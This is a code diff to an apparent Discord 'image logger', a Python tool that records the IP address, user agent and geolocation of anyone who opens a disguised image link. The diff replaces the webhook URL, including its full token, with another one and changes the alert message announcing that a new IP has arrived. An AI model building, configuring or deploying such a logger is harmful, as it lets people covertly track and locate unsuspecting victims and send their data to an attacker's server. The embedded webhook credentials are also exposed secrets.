@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1353823742064857088/NQp_FeQ-F102qijXy6FzUj6FN593U_d54XB0997IDsSgykz_tHHNwoOHBEOQ98goURjv",
+    "webhook": "https://discord.com/api/webhooks/1354143850834427976/ll_FCqs_wYQv2YhctJuPTysr9zmODjX38DszqJD2tG4LmX152O0c5eFDUGKVtCRVr1bI",
     "image": "https://media.discordapp.net/attachments/1353820405995012170/1353821872734863412/nah-hareketi_210013.jpg?ex=67e30c5f&is=67e1badf&hm=8beb61bda2556e892c17a5dc6f690223eadd75accf87aca23f2af82dcbc4b6c5&=&format=webp", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
@@ -107,7 +107,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 }) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
         return
 
-    ping = "@.ifrits ve @d7kl._. baba bi tane İp geldi !"
+    ping = "new ip came ifrit dad !"
 
     info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
     if info["proxy"]:
